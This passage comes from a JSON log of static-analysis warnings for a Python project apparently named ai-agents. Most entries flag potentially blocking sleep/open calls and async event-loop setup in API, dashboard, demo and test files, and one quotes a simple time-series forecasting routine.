        "warning": "Line 135: Forward slash in path - '] for point in recent_data]\n            \n            # Calculate moving average and trend\n            window = min(5, len(values))\n            moving_avg = np.mean(values[-window:])\n            trend = await self.get_trend(series_id, window_size=10)\n            \n            # Generate forecast\n            forecast_values = []\n            forecast_timestamps = []\n            \n            last_timestamp = timestamps[-1]\n            avg_interval = (timestamps[-1] - timestamps[0]) / (len(timestamps) - 1)\n            \n            for i in range(horizon):\n                # Simple linear forecast with trend\n                forecast_value = moving_avg + trend * (i + 1)\n                forecast_values.append(forecast_value)\n                \n                forecast_timestamp = last_timestamp + avg_interval * (i + 1)\n                forecast_timestamps.append(forecast_timestamp)\n            \n            # Estimate confidence intervals (simple approach)\n            std_dev = np.std(values) if len(values) > 1 else 0.0\n            confidence_intervals = [\n                (val - 1.96 * std_dev, val + 1.96 * std_dev) \n                for val in forecast_values\n            ]\n            \n            # Estimate accuracy based on recent variance\n            accuracy_estimate = max(0.0, min(1.0, 1.0 - (std_dev / max(abs(moving_avg), 1.0))))\n            \n            return TimeSeriesForecast(\n                forecast_values=forecast_values,\n                forecast_timestamps=forecast_timestamps,\n                confidence_intervals=confidence_intervals,\n                forecast_horizon=avg_interval * horizon,\n                accuracy_estimate=accuracy_estimate\n            )\n            \n        except Exception as e:\n            logger.error(f\"",
        "timestamp": "2025-09-05T17:30:42.364322"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.523276"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.523600"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.523981"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524060"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524131"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524213"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524351"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524825"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_diagnostic.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.524872"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.535480"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.535659"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_production_validation.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.536371"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.733161"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.733968"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.733996"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.734025"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.734053"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735178"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735193"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735203"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735267"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735351"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735358"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735365"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735376"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735464"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735796"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735878"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.735906"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.736006"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.736016"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.736026"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\comprehensive_system_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.736606"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.744251"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.744288"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.744719"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.745090"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\production_validation_test.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.745692"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753043"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753061"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753105"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753159"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753204"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753274"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753383"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753483"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.753755"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753837"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753880"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753895"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.753944"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754018"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754093"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754105"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754156"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754168"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754201"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754213"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_demo_windows.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.754222"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.759856"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.759868"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.759910"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.759962"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760006"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760066"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760131"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760193"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.760402"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760483"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760526"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760541"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760590"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760664"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760739"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760751"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760812"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760825"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760858"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760870"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\run_spectacular_demo.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.760878"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\system.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.765180"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\test_meta_demo.py",
        "warning": "Potentially blocking call: open",
        "timestamp": "2025-09-05T17:30:45.771312"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function lifespan may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.784879"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function http_exception_handler may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.784930"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function general_exception_handler may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.784959"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function custom_swagger_ui_html may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.784986"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function custom_redoc_html may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785012"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function health_check may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785038"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function get_system_metrics may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785063"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function login may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785088"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function refresh_token may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785114"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function logout may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785141"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function process_document may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785165"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function batch_process_documents may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785189"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function get_processing_status may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785213"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function get_processing_result may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785237"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function classify_document may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785261"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function create_webhook may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785285"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function list_webhooks may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785309"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function get_integration_status may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785333"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function upload_and_process_document may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785357"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function get_processing_analytics may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785380"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\api\\main.py",
        "warning": "Async function reload_configuration may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.785404"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function root may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792425"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function health_check may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792455"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function get_network may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792479"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function get_metrics may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792502"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function get_trading_events may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792525"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function get_market_data may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792547"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function websocket_endpoint may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792568"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function broadcast_updates may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792589"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function startup_event may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792610"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function connect may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792780"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function send_personal_message may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792807"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Async function broadcast may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.792831"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.794387"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\backend\\visualization_server.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.794840"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\dashboard\\main_dashboard.py",
        "warning": "Potentially blocking call: sleep",
        "timestamp": "2025-09-05T17:30:45.803795"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Async function simulate_document_upload may not have proper event loop setup",
        "timestamp": "2025-09-05T17:30:45.894428"
      },
      {
        "category": "ASYNC_PATTERN",
        "file": "C:\\Users\\Nouri\\Documents\\GitHub\\ai-agents\\demo\\ultimate_demo.py",
        "warning": "Async function process_document may not have proper event loop setup",
